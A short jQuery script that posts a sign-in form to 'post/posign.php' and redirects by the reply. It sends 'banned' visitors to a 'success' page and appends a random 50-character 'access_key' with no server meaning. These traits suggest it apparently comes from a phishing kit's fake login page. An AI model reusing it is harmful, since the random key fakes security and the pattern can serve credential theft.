$("#signin").validate({
  submitHandler: function(form) {
    $.post("post/posign.php", $("#signin").serialize(), function(GET) {
      if (GET == "error") {
        setTimeout(function() {
          document.getElementById("loading").className = "transitioning hide";
          document.getElementById("notifications").className = "notification notification-critical";
        })
      } else if (GET == "banned") {
        setTimeout(function() {
          window.location.assign("success");
        })
      } else {
        setTimeout(function() {
          window.location.assign("myaccount/home?access_key="+ngerandom());
        })
      }
    });
  },
});
function ngerandom() {
  var text = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (var i = 0; i < 50; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));

  return text;
}
